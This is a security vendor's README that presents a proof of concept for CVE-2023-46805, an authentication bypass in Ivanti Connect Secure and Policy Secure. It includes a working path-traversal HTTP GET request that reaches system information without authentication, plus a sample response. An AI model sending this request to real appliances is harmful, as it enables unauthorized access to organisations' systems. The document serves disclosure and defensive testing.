# Ivanti CVE-2023-46805 PoC Exploit
CISA issued an emergency directive on Ivanti CVE-2023-46805 vulnerability. The agency also reported that CVE-2023-46805 poses unacceptable risks to many federal agencies and should be mitigated immediately.<br><br>
In this repo, Picus provides a Proof-of-Concept exploit for the CVE-2023-46805 vulnerability.

Test security controls against the CVE-2023-46805 vulnerability exploit 
--------------------------------------
Picus can help you simulate the CVE-2023-46805 vulnerability exploits for free. No setup or signup is required.<br>
Use [Picus Emerging Threat Simulator](https://insights.picussecurity.com/emerging-threat-simulator-announcement?utm_source=github&utm_medium=organic+social&utm_campaign=PLS+Offensive+-+ET+Simulator) and test your defenses in a few clicks.<br> 

If you are looking for more detailed information, check out our blog post: [Ivanti CVE-2023-46805 and CVE-2024-21887 Zero-Day Vulnerabilities Actively Exploited](https://www.picussecurity.com/resource/blog/ivanti-cve-2023-46805-and-cve-2024-21887-zero-day-vulnerabilities)


CVE-2023-46805 Proof-of-concept (POC)
----------------------
Ivanti CVE-2023-46805 vulnerability is an authentication bypass vulnerability found in the web component of Ivanti Connect Secure and Policy Secure products.<br>
The vulnerability is caused by a path traversal vulnerability found in the "/api/v1/totp/user-backup-code" endpoint. Additionally, this endpoint does not require any authentication, allowing adversaries to access public-facing endpoints.<br>
Adversaries combine the lack of authentication and path traversal vulnerability to access resources located in the endpoint.

The example HTTP GET request below exploits CVE-2023-46805 vulnerability to view system information without authentication.

#### Example CVE-2023-46805 Exploit:
```http
GET /api/v1/totp/user-backup-code/../../system/system-information
HTTP/1.1 Host: <IP_Vulnerable_Ivanti_Product>
Content-Length: 0

//Response from the vulnerable product
…
    "system-information" : {
        "Cluster-node" : {},
        "Hardware-model" : "PSA-3000",
        "host-name" : <redacted>
        "machine-id" : <redacted>
        "os-name" : "ive-sa",
        "os-version" : "9.1R18.1",
        "serial-number": <redacted>
    ｝
…
```

Disclaimer
----------
©2024 Picus Security <br>
All rights reserved.
